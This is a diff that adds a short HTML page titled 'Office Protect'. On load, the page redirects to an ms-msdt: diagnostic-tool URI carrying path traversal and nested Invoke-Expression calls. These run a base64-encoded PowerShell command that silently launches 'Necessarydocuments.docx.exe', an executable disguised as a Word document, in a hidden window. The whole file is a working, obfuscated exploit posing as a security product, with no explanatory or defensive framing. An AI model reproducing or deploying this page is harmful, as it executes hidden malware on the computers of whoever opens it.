@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Office Protect</title>
+</head>
+<body>
+    <script>
+        var payload = "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiRlbnY6Q0RcTmVjZXNzYXJ5ZG9jdW1lbnRzLmRvY3guZXhlIiAtV2luZG93U3R5bGUgSGlkZGVu";
+        window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"' + payload + '\"))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
+    </script>
+</body>
+</html>
